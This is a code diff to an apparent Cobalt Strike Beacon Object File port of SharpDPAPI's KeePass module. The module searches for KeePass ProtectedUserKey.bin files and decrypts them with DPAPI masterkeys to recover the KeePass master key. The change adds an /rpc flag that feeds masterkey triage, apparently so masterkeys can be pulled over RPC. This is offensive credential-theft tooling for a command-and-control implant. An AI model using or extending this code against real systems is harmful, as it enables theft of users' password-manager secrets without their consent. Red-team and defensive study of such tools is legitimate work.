@@ -3,7 +3,7 @@
  *
  * Usage:
  *   keepass [/pvk:BASE64] [/password:PASSWORD] [/ntlm:HASH]
- *           [/credkey:KEY] [/target:PATH] [/unprotect]
+ *           [/credkey:KEY] [/target:PATH] [/unprotect] [/rpc]
  *
  * Searches for KeePass ProtectedUserKey.bin files and attempts
  * to decrypt them to recover the KeePass master key trigger.
@@ -24,6 +24,7 @@ void go(char* args, int args_len) {
     char* credkey    = BeaconDataExtract(&parser, NULL);
     char* target_str = BeaconDataExtract(&parser, NULL);
     int   unprotect  = BeaconDataInt(&parser);
+    int   use_rpc    = BeaconDataInt(&parser);
 
     BYTE* pvk = NULL;
     int pvk_len = 0;
@@ -63,11 +64,11 @@ void go(char* args, int args_len) {
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI KeePass (BOF) ===\n");
 
     /* Triage masterkeys */
-    if (pvk || password || ntlm) {
+    if (pvk || password || ntlm || use_rpc) {
         triage_user_masterkeys(&cache, pvk, pvk_len,
             (password && strlen(password) > 0) ? password : NULL,
             (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
-            NULL, FALSE, NULL, NULL, FALSE, NULL);
+            NULL, (BOOL)use_rpc, NULL, NULL, FALSE, NULL);
     }
 
     /* Triage KeePass */
